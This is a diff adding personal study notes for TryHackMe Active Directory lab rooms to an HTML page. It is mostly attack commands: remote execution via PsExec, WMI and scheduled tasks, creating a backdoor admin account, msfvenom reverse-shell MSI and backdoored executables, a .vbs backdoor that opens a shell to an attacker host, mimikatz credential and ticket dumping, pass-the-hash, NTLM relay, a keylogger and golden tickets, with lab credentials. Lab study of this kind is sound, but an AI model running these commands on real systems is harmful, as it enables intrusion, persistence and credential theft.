+                        <br>`Get-WmiObject -Class win32_groupuser | where { $_.groupcomponent -match 'Administrator' } | foreach {[wmi]$_.partcomponent}`
+                        <br>Finding machines in the domain
+                        <br>`Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select ds_cn`
+                        <br>Enumerating admin privileges across AD
+                        <br>`$pcs = Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select -ExpandProperty ds_cn
+                        <br>foreach ($pc in $pcs) { (Get-WmiObject -Class win32_computersystem -ComputerName $pc -ErrorAction silentlycontinue).name }`
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Lateral Movement and Pivoting</span> </button>    
+                    <div class="sub_dropdown_content">
+                        <br>https://benheater.com/tryhackme-lateral-movement-pivoting/
+                        <br>`openvpn --config ./lateralmovementandpivoting.ovpn --daemon`
+                        <br>edit /etc/resolv.conf  'search za.tryhackme.com' 'nameserver 10.200.54.101' on up of another nameserver
+                        <br>`systemctl restart networking.service`
+                        <br>test DNS `ping za.tryhackme.com` `nslookup thmdc.za.tryhackme.com`
+                        <br>http://distributor.za.tryhackme.com/creds
+                        <br>`ssh username@za.tryhackme.com@thmjmp2.za.tryhackme.com`
+                        <br>The built-in default administrator account is not subject to UAC, while other local administrator accounts are.
+                        <br><span class="step_title">Remote Sessions</span>
+                        <br>=====PsExec TCP/445 Requires the account to be an administrator
+                        <br>`.\psexec.exe \\target-ip -u username -p password -i cmd.exe`
+                        <br>Workflow: Upload psexecsvc.exe via ADMIN$ share, Create and execute psexec service, Communicate via \.\pipe\psexecsvc
+                        <br>=====WinRM HTTP:TCP/5985 OR HTTPS:TCP/5986
+                        <br>`$username = 'user.name'`
+                        <br>`$password = 'mypass' | ConvertTo-SecureString -AsPlainText -Force`
+                        <br>`$credential = [pscredential]::new($username, $password)`
+                        <br>`Invoke-Command -ComputerName target-ip -Credential $credential -ScriptBlock {Get-Command}`
+                        <br>`$session = New-PSSession -ComputerName target-ip -Credential $credential`
+                        <br>`$session | Enter-PSSession` `$session | Remove-PSSession`
+                        <br>=====sc.exe RCE by registering and running services on a host. The service is configured to run a command at start up.
+                        <br>`sc.exe \\target-ip create FakeService binpath= "net user adm1n p@ssword123! /add" start= auto`
+                        <br>`sc.exe \\target-ip start FakeService`
+                        <br>`sc.exe \\target-ip stop FakeService` `sc.exe \\target-ip delete FakeService`
+                        <br>Workflow: Try to authenticate to the Service Control Manager via RPC first. If RPC fails, attempt to communicate via a SMB named pipe.
+                        <br>=====schtasks: Remote command/payload execution by registering a scheduled task on a host.
+                        <br>schtasks /s target-ip /RU "SYSTEM" /create /tn "MyTask" /tr "powershell -command 'Get-ComputerInfo'" /sc ONCE /sd 01/01/1970 /st 00:00
+                        <br>schtasks /s target-ip /run /tn "MyTask"
+                        <br>schtasks /s target-ip /tn "MyTask" /DELETE /F
+                        <br><span class="step_title">Moving Laterally Using WMI</span>
+                        <!-- ===========================need review=========================== -->
+                        <br>Connecting to WMI from PowerShell
+                        <br>Requirements_1: Target Ports: RPC - TCP/135 + TCP/49152-65535 Or WinRM_HTTP:TCP/5985 WinRM_HTTPS:TCP/5986
+                        <br>Requirements_2: user.name has Administrators Group Memberships
+                        <br>Create a Credential Object for Authentication
+                        <br>`$username = 'user.name' ; $password = 'password' | ConvertTo-SecureString -AsPlainText -Force`
+                        <br>`$credential = [pscredential]::new($username, $password)`
+                        <br>Create a CIM Session for Repeated Use
+                        <br>`$server = 'target-ip / fqdn' ; $sessionopt = New-CimSessionOption -Protocol DCOM`
+                        <br>`$session = New-CimSession -ComputerName $server -Credential $credential -SessionOption $sessionopt -ErrorAction Stop`
+                        <br>Run a Command Remotely
+                        <br>`$kaliVpnIP = 'kali-vpn-ip' ; $kaliPort = 443`
+                        <br>`$command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command `"[Net.Sockets.TcpClient]::new().ConnectAsync('$kaliVpnIP', $kaliPort)`""`
+                        <br>note: the ` inside is used for denote the "
+                        <br>`$parameters = @{ CimSession = $session;ClassName = 'Win32_Process';MethodName = 'Create';Arguments = @{CommandLine = $command} }`
+                        <br>`Invoke-CimSession @parameters`
+                        <br>Creating Services Remotely
+                        <br>Create the Service
+                        <br>`$parameters = @{CimSession = $session;ClassName = 'Win32_Service';MethodName = 'Create'; Arguments = @{Name = 'l337service';DisplayName = 'l337service';PathName = 'net user adm1n password123 /ADD';ServiceType = [byte]16;StartMode = 'Manual'} }`
+                        <br>`Invoke-CimMethod @parameters`
+                        <br>Discover the Service and Start it
+                        <br>`$svc = Get-CimInstance -CimSession $session -ClassName Win32_Service -Filter "Name LIKE 'l337service'"`
+                        <br>`$svc | Invoke-CimMethod -MethodName StartService`
+                        <br>Modify the Service and Re-Run It
+                        <br>`$svc | Invoke-CimMethod -MethodName Change -Arguments @{PathName = 'net localgroup Administrators adm1n /ADD'}`
+                        <br>`$svc | Invoke-CimMethod -MethodName StartService`
+                        <br>Clean up the Service
+                        <br>`$svc | Invoke-Cimmethod -MethodName StopService`
+                        <br>`$svc | Invoke-CimMethod -MethodName Delete`
+                        <br>Create Scheduled Tasks Remotely
+                        <br>Define a Task Action
+                        <br># Same as running cmd.exe /c net user adm1n password123 /ADD
+                        <br># Add a local user adm1n with password 123
+                        <br>`$command = 'cmd.exe'`
+                        <br>`$arguments = '/c net user adm1n password123 /ADD'`
+                        <br>`$parameters = @{CimSession = $session;Execute = $command;Argument = $arguments}`
+                        <br>`$action = New-ScheduledTaskAction @parameters`
+                        <br>Create and Start the Task
+                        <br>`$parameters = @{CimSession = $session;Action = $action;User = 'NT AUTHORITY\SYSTEM';TaskName = 'l337task'}`
+                        <br>`$task = Register-ScheduledTask @parameters`
+                        <br>`$task | Start-ScheduledTask`
+                        <br>Update and Delete the Task
+                        <br>`$arguments = '/c net user adm1n password123 /ADD'`
+                        <br>`$parameters = @{CimSession = $session;Execute = $command;Argument = $arguments}`
+                        <br>`$action = New-ScheduledTaskAction @parameters`
+                        <br>`$task = Set-ScheduledTask -CimSession $session -TaskName l337task -Action $action`
+                        <br>`$task | Start-ScheduledTask`
+                        <br>`$task | Unregister-ScheduledTask`
+                        <br>Install MSI Packages
+                        <br>Create a MSI Payload
+                        <br>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali-vpn-ip LPORT=443 -f msi -o l337pkg.msi`
+                        <br>`smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_corine.waters%Korine.1994' -c 'put l337pkg.msi' --option="client min protocol=core"`
+                        <br>`nc -lnvp 443`
+                        <br>Install the MSI Payload
+                        <br>`$username = 't1_corine.waters';$pw = 'Korine.1994' | ConvertTo-SecureString -AsPlainText -Force`
+                        <br>`$credential = [pscredential]::new($username, $pw);$sessionopt = New-CimSessionOption -Protocol DCOM`
+                        <br>`$parameters = @{ComputerName = 'thmiis.za.tryhackme.com';Credential = $credential;SessionOption = $sessionopt;ErrorAction = 'Stop';}`
+                        <br>`$session = New-CimSession @parameters`
+                        <br>`$parameters = @{CimSession = $session;ClassName = 'Win32_Product';MethodName = 'Install';Arguments = @{PacakgeLocation = 'C:\Windows\l337pkg.msi';Options = $null;AllUsers = $false} }`
+                        <br>`Invoke-CimMethod @parameters`
+                        <br><span class="step_title">Use of Alternate Authentication Material</span>
+                        <!-- ===========================need review=========================== -->
+                        <br>Rubeus: https://github.com/GhostPack/Rubeus#asreproast
+                        <br>mimikatz_manual_1: https://adsecurity.org/?page_id=1821
+                        <br>mimikatz_manual_2: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md
+                        <br>=====NTLM Authentication|Pass-the-Hash
+                        <br>Dump NTLM Hashes
+                        <br>`privilege::debug` `sekurlsa::msv`
+                        <br>Pass-the-Hash with Mimikatz
+                        <br>`token::revert`
+                        <br>`sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe kali-vpn-ip 443`
+                        <br>Pass-the-Hash from Kali
+                        <br>`impacket-wmiexec -hashes ':533f1bd576caa912bdb9da284bbc60fe' 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com'`
+                        <br>https://notes.benheater.com/books/active-directory/page/mimikatz
+                        <br>https://notes.benheater.com/books/active-directory/page/dumping-hashes-without-mimikatz
+                        <br>=====Kerberos Authentication|Pass-the-Ticket|Pass-the-Key|Overpass-the-Hash
+                        <br>Dump Kerberos Tickets
+                        <br>`sekurlsa::tickets /export`
+                        <br>file_example: [0;97d82]-2-0-40e10000-t2_felicia.dean@krbtgt-ZA.TRYHACKME.COM.kirbi
+                        <br>[0x97d82]: user_LUID
+                        <br>-2-: kerberos_ticket_type (0=TGS, 1=Client_ticket, 2=TGT)
+                        <br>0-40e10000: 0x40e10000 kerberos flag [1]
+                        <br>Pass-the-Ticket with Mimikatz
+                        <br>`kerberos::ptt [0;ca99f8]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi`
+                        <br>exit mimikatz and check `klist`
+                        <br>get a a shell with the ticket `winrs.exe -r:thmiis.za.tryhackme.com cmd.exe`
+                        <br>Pass-the-Ticket from Kali
+                        <br>`impacket-ticketConverter \[0\;ca99f8\]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi t1_toby.beck.ccache`
+                        <br>`export KRB5CCNAME=t1_toby.beck.ccache`
+                        <br>`impacket-wmiexec za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com -k -no-pass`
+                        <br>Dump Kerberos Encryption Keys
+                        <br>`sekurlsa::ekeys`
+                        <br>Pass-the-Key with Mimikatz
+                        <br>`token::revert`
+                        <br>`sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:"C:\tools\nc64.exe -e cmd.exe kali-vpn-ip 443"`
+                        <br>Pass-the-Key from Kali
+                        <br>`impacket-getTGT 'za.tryhackme.com/t1_toby.beck' -aesKey 6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e`
+                        <br>`export KRB5CCNAME=t1_toby.beck.ccache`
+                        <br>`impacket-wmiexec 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com' -k -no-pass`
+                        <br><span class="step_title">Abusing User Behavior</span>
+                        <br>Backdooring .vbs Scripts
+                        <br>`CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\FILE-SERVER-IP\share_name\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe attacker-ip-address 80", 0, True`
+                        <br>Backdooring .exe Files
+                        <br>`msfvenom -a x64 --platform windows -x /tmp/filename.exe -k -p windows/x64/shell_reverse_tcp LHOST=kali-ip-address LPORT=80 -b '\x00' -f exe -o filename.exe`
+                        <br>RDP Session Hijacking
+                        <br>On Windows Server 2016 and older, if a user opens a RDP session from Windows Server to another host, and the RDP session was closed (not logged out), the session remains logged in until the server is rebooted.
+                        <br>The attacker does not need to know the password used when the original RDP session was created.
+                        <br>On Windows Server 2019 and newer, the attacker must know the password used to create the RDP session.
+                        <br>NT AUTHORITY\SYSTEM> query user
+                        <br>output: USERNAME SESSIONAME ID STATE IDLE_TIME LOGON_TIME
+                        <br>NT AUTHORITY\SYSTEM> tscon ID /dest:SESSIONAME
+                        <br>NT AUTHORITY\SYSTEM> tscon 3 /dest:rdp-tcp#5
+                        <br><span class="step_title">Port Forwarding</span>
+                        <br>https://notes.benheater.com/books/network-pivoting
+                        <br>The room contents only has chisel, but I note everyone.
+                        <br>plink https://documentation.help/PuTTY/plink-usage.html
+                        <br>chisel https://github.com/jpillora/chisel
+                        <br>sshuttle https://github.com/sshuttle/sshuttle
+                        <br>squid https://www.tecmint.com/install-squid-in-ubuntu/
+                        <br>ssh https://notes.benheater.com/books/network-pivoting/page/penetrating-networks-via-ssh-jumphosts
+                        <br>setup proxychains https://trojand.com/cheatsheet/Network/Connections/SSH_Tunneling.html#dynamic-port-forwarding-with-proxychains
+                        <br>The only proxy tool I need is ligolo-ng:
+                        <br>ligolo-ng https://github.com/nicocha30/ligolo-ng
+                        <br>https://systemweakness.com/everything-about-pivoting-oscp-active-directory-lateral-movement-6ed34faa08a2
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Exploiting Active Directory</span> </button>    
+                    <div class="sub_dropdown_content">
+                        <br>https://benheater.com/tryhackme-exploiting-active-directory
+                        <br>`openvpn --config ./exploitingad.ovpn --daemon`
+                        <br>edit /etc/resolv.conf  'search za.tryhackme.com' 'nameserver 10.200.60.101' on up of another nameserver
+                        <br>`systemctl restart networking.service`
+                        <br>test DNS `ping za.tryhackme.com` `nslookup thmdc.za.tryhackme.com`
+                        <br>http://distributor.za.tryhackme.com/creds
+                        <br><span class="step_title">Exploiting Permission Delegation</span>
+                        <br>=====Exploiting ACEs: Access Control Entries (ACEs) populate Discretionary Access Control Lists (DACLs). These ACLs determine the permissions that certain AD objects have over others.
+                        <br>ForceChangePassword : Set a user's password without knowing their current password.
+                        <br>AddMembers : Add users (including oneself), groups, or computers to a target group.
+                        <br>GenericAll : Complete control over an object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
+                        <br>GenericWrite : Update any non-protected parameters of our target object. For example, could update the scriptPath parameter, which would set a user's logon script.
+                        <br>WriteOwner : Update the owner of the target object. Could make ourselves the owner, allowing us to gain additional permissions over the object.
+                        <br>WriteDACL : We have the ability to write new ACEs to the target object's DACL. For example, could write an ACE that grants our account full control over the target object.
+                        <br>AllExtendedRights : Perform any action associated with extended AD rights against the target object. For example, the ability to force change a user's password.
+                        <br>=====Inspecting Bloodhound Data
+                        <br>Our user account is in 'Domain Users' group, which has 'GenericWrite' over 'IT Support' group.
+                        <br>`$user = Get-ADUser -Identity 'user.name' ; $group = Get-ADGroup -Identity 'IT Support'`
+                        <br>`Add-ADGroupMember -Identity $group -Members $user ; Get-ADGroupMember -Identity $group`
+                        <br>'IT Support' group has 'ForceChangePassword' over the 'Tier 2 Administrators' group.
+                        <br>`$t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1`
+                        <br>`$password = 'strong.pass1' | ConvertTo-SecureString -AsPlainText -Force`
+                        <br>`Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password`
+                        <br>`xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'t2.admin' /p:'newpass'`
+                        <br><span class="step_title">Exploiting Kerberos Delegation</span>
+                        <!-- ===========================need review=========================== -->
+                        <br>General purpose of Kerberos delegation is to allow an application or service to access a resource on another machine on behalf of a user or machine.
+                        <br>If a user logs into an application, the application will request resources on other machines on behalf of the user.
+                        <br>Removes the need for a global service account with less granular permissions.
+                        <br>=====Unconstrained Delegation: 
+                        <br>TRUSTED_FOR_DELEGATION
+                        <br>A host has no limit on the resources it can access on behalf of a user who connects, as long as the user has the TRUSTED_FOR_DELEGATION flag set. Once a user connects, the host requests a TGT for the user and caches it locally for future use.
+                        <br># Get the service account
+                        <br>`$serviceAccount = Get-ADUser -Identity "ServiceAccount"`
+                        <br># Enable Unconstrained Delegation for the service account
+                        <br>`Set-ADUser -Identity $serviceAccount -PrincipalsAllowedToDelegateToAnyService $true`
+                        <br># Get the service account and check if Unconstrained Delegation is enabled
+                        <br>`$serviceAccount = Get-ADUser -Identity "ServiceAccount" ; $serviceAccount.msDS-AllowedToDelegateTo`
+                        <br>=====Constrained Delegation: 
+                        <br>TRUSTED_TO_AUTH_FOR_DELEGATION
+                        <br>msDS-AllowedToDelegateTo
+                        <br>Restricts the type of services a service acount can request on behalf of a user.
+                        <br>ChatGPT:Limits the delegation based on the services that a specific service account can access. It involves directly specifying which services a service account can delegate to, without directly involving the machine's identity.It focuses on restricting delegation to specific service types or accounts (iis_service delegating to db_service).
+                        <br># Get the service account
+                        <br>`$serviceAccount = Get-ADUser -Identity "ServiceAccount"`
+                        <br># Configure Constrained Delegation for specified services
+                        <br>`Set-ADUser -Identity $serviceAccount -PrincipalsAllowedToDelegateTo @{Add="HTTP/Service1", "HTTP/Service2"}`
+                        <br># Get the service account and check its Constrained Delegation settings
+                        <br>`$serviceAccount = Get-ADUser -Identity "ServiceAccount" ; $serviceAccount.msDS-AllowedToDelegateTo`
+                        <br>=====Resource-Based Constrained Delegation:
+                        <br>msDS-AllowedToActOnBehalfOfOtherIdentity
+                        <br>Grant msDS-AllowedToActOnBehalfOfOtherIdentity to [service] account on [MSSQL] and [CIFS]. 
+                        <br>This allows the SERVICE OWNER to decide which accounts can be delegates to other users.
+                        <br>ChatGPT:Goes beyond the service account level and associates the delegation capability with the computer objects.It designates the initiator (the machine account) and associates it with a specific service or SPN.This method allows a machine's identity to access a particular service (identified by SPN) on behalf of users accessing that machine's services.
+                        <br># Get the service account and target computer
+                        <br>`$serviceAccount = Get-ADUser -Identity "ServiceAccount"`
+                        <br>`$targetComputer = Get-ADComputer -Identity "TargetComputer"`
+                        <br># Add the specific computer as allowed to act on behalf of the service account
+                        <br>`Set-ADUser -Identity $serviceAccount -Add @{msDS-AllowedToActOnBehalfOfOtherIdentity="$($targetComputer.DistinguishedName)"}`
+                        <br># Get the service account and check Resource-Based Constrained Delegation settings
+                        <br>`$serviceAccount = Get-ADUser -Identity "ServiceAccount" ; $serviceAccount.msDS-AllowedToActOnBehalfOfOtherIdentity`
+                        <br>=====Enumerate Users with Constrained Delegation
+                        <br>`Import-Module C:\tools\PowerView.ps1 ; Get-NetUser -TrustedToAuth`
+                        <br>output: samaccountname: svcIIS  msds-allowedtodelegateto:  WSMAN... http...
+                        <br>`Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartName -like 'svcIIS*'} | Select-Object *`
+                        <br>analize output we found when system start, the svcIIS account will auto-start a service which executes C:\Windows\system32.cmd.exe . That should spawn a command prompt and cause the credential to cache in memory.
+                        <br>`mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"`
+                        <br>got cred: svcIIS@za.tryhackme.loc:Password1@
+                        <br>=====Remotely Dumping Secrets
+                        <br>impacket-secretsdump 'za.tryhackme.loc/t2_lawrence.lewis:strong.pass1@thmwrk1.za.tryhackme.loc'
+                        <br>got cred: svcIIS@za.tryhackme.loc:Password1@
+                        <br>=====Request a TGT and Perform the Attack
+                        <br>mimikatz # token::revert
+                        <br>`C:\Tools\kekeo\x64\kekeo.exe`
+                        <br>Request a TGT using the svcIIS credentials.
+                        <br>kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
+                        <br>Request a S4U TGS on behalf of t1_trevor.jones to the HTTP service on THMSERVER1 using the TGT
+                        <br>kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc                        
+                        <br>Request a S4U TGS on behalf of t1_trevor.jones to the WSMAN service on THMSERVER1 using the TGT
+                        <br>kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
+                        <br>=====Inject the S4U TGS ticket into our current session as the tier 2 admin and lanch a command prompt.
+                        <br>mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
+                        <br>mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi                        
+                        <br>mimikatz # misc::cmd
+                        <br>`klist` there should have 2 Cached Tickets
+                        <br>`winrs -r:thmserver1.za.tryhackme.loc cmd`
+                        <br><span class="step_title">Exploiting Automated Relays</span>
+                        <!-- ===========================need review=========================== -->
+                        <br>We can force a computer account to initiate an authentication request Computer accounts(end in $) – like user accounts – have a username and password
+                        <br>custom Bloodhound query to find computer accounts that have admin rights over other computer accounts
+                        <br>`MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`
+                        <br>=====Verify: Print Spooler Service + SMB Signing not enforce
+                        <br>Verify the Print Spooler Service is Running
+                        <br>`Get-WmiObject Win32_Printer -Computer hostname.fqdn`
+                        <br>OR
+                        <br>`Get-PrinterPort -ComputerName hostname.fqdn`
+                        <br>Verify SMB Signing Enforcement
+                        <br>`nmap -Pn -p445 --script=smb2-security-mode thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc`
+                        <br>crackmapexec smb thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
+                        <br>=====Exploiting Authentication Relays
+                        <br>We want to use NTLM authentication against the THMSERVER1. THMSERVER2 has administrative privileges over THMSERVER1. 
+                        <br>Use SpoolSample.exe to connect to THMSERVER2 and tell it to authenticate back to us
+                        <br>We will relay that authentication request to THMSERVER1. THMSERVER1 will see it as though we are connecting as THMSERVER2 , which will give us administrative privileges
+                        <br>`ntlmrelayx.py -smb2support -t smb://"10.200.60.201" -debug`
+                        <br>THMWRK1 RDP> C:\Tools\SpoolSample.exe thmserver2.za.tryhackmloc "kali-vpn-ip"
+                        <br><span class="step_title">Exploiting AD Users Hunting for Credentials</span>
+                        <br>=====Using Meterpreter's Keylogger
+                        <br>meterpreter > keyscan_start
+                        <br>meterpreter > keyscan_dump
+                        <br>meterpreter > keyscan_stop
+                        <br>=====KeePass Vault file
+                        <br>got .kdbx file password: Imreallysurenoonewillguessmypassword
+                        <br>`apt install -y kpcli`
+                        <br>`kpcli`
+                        <br>kpcli:/> open PasswordDatabase.kdbx
+                        <br>kpcli:/> ls
+                        <br>kpcli:/> ls PasswordDatabase/*
+                        <br>kpcli:/> show -f -a PasswordDatabase/General/Flag
+                        <br>THM{AD.Users.Can.Give.Up.Good.Secrets}
+                        <br>kpcli:/> show -f -a PasswordDatabase/General/svcServMan
+                        <br>Sup3rStr0ngPass!@
+                        <br><span class="step_title">Exploiting Group Policy Objects</span>
+                        <br>Bloodhound show svcServMan ownership over a GPO.
+                        <br>note: GPOs are saved in the SYSVOL directory when they are synchronized from the domain controller.
+                        <br>RDP into THMWRK1 as standard domain user or T2 admin
+                        <br>`xfreerdp /v:thmwrk1.za.tryhackme.loc /u:username /p:'password'`
+                        <br>Inject the svcServMan as a network credential
+                        <br>`runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe`
+                        <br>open `mmc.exe` in the new cmd window
+                        <br>Edit the GPO remotely on THMSERVER2 via MMC
+                        <br>Console_Root>>Group_Policy_Management>>Forest:tryhackme.loc>>Domains>>za.tryhackme.loc>>Servers>>Management_Servers>Management_Server
+                        <br>Add_Group>>Browse>>Search"IT Support">> Click OK
+                        <br>Make "IT Support" Administrators and Remote Desktop Users on THMSERVER2
+                        <br>Now we can use low-level user cred from http://distributor.za.tryhackme.loc/creds , as this user is a member of the IT Support group after we added the user
+                        <br><span class="step_title">Exploiting Group Policy Objects</span>
+                        <br>`certutil -Template -v > .\templates.txt`
+                        <br>A certificate template can be exploited if the following parameters are present:
+                        <br>Client Authentication: Certificate can be used in client authentication
+                        <br>CT_FLAG_ENROLEE_SUPPLIES_SUBJECT: Can specify an alternate SAN
+                        <br>CTPRIVATEKEY_FLAG_EXPORTABLE_KEY: Can export the private key along with the certificate
+                        <br>Certificate Permissions: User has the permissions to use the template
+                        <br>=====Exploit a Certificate Template
+                        <br>Launch mmc.exe and add the Certificates snap-in.
+                        <br>Follow along with the steps to request a new Personal certificate.
+                        <br>Follow the steps to export the certificate along with the private key.
+                        <br># Use Rubeus to Inject the Certificate
+                        <br>`Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\Users\username\Desktop\mycert.pfx /password:password123 /outfile:pwnz.kirbi /domain:za.tryhackme.loc /dc:10.200.60.101`
+                        <br># Use Mimikatz to Pass-the-Ticket
+                        <br>`mimikatz.exe "privilege::debug" "kerberos::ptt pwnz.kirbi" "misc::cmd"
+                        <br>enter file `explorer.exe` in the new cmd window
+                        <br>Now we can browse \\thmdc.za.tryhackme.loc\C$ file system
+                        <br><span class="step_title">Exploiting Domain Trusts</span>
+                        <br>A forest, in Active Directory terms, is comprised of domain trees Trusts define how the various domains in a forest can talk to one another
+                        <br>The main types of trusts are :
+                        <br>Directional: Trust flows from one domain to another trusted domain
+                        <br>Transitive: Trust flows between multiple trusted domains
+                        <br>=====Golden Tickets
+                        <br>If an attacker compromises a domain controller and achieves full SYSTEM rights, it is possible to extract the hash of the krbtgt account. This would allow the attacker to create TGS tickets for any resources
+                        <br>In order to create golden tickets, the following must be known:
+                        <br>FQDN of the domain
+                        <br>SID of the domain
+                        <br>Username to impersonate
+                        <br>KRBTGT hash
+                        <br>mimikatz # lsadump::dcsync /user:za\krbtgt
+                        <br>mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt
+                        <br>now verify by browse file system \\thmrootdc.tryhackme.loc\C$
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Persisting Active Directory</span> </button>    
+                    <div class="sub_dropdown_content">
+                        <br>
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Bandit</span> </button>    
+                    <div class="sub_dropdown_content">
+                        <br>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <!-- ========================tryhackme_content======================== -->
         <!-- ========================vulnhub_content======================== -->
         <div class="dropdown">
             <button class="dropdown_button" id="vulnhub_button"></button>
@@ -3349,16 +4047,6 @@
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/vulnhub_icon.png" alt="img"> <span>DC1</span> </button>
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
@@ -3366,16 +4054,6 @@
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/vulnhub_icon.png" alt="img"> <span>DC2</span> </button>
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
@@ -3383,16 +4061,6 @@
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/vulnhub_icon.png" alt="img"> <span>DC3</span> </button>
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
@@ -3400,16 +4068,6 @@
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/vulnhub_icon.png" alt="img"> <span>DC4</span> </button>
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
@@ -3417,16 +4075,6 @@
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/vulnhub_icon.png" alt="img"> <span>DC5</span> </button>
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
@@ -3434,16 +4082,6 @@
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/vulnhub_icon.png" alt="img"> <span>DC6</span> </button>
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
@@ -3451,16 +4089,6 @@
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/vulnhub_icon.png" alt="img"> <span>DC7</span> </button>
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
@@ -3468,16 +4096,6 @@
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/vulnhub_icon.png" alt="img"> <span>DC8</span> </button>
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
@@ -3485,188 +4103,13 @@
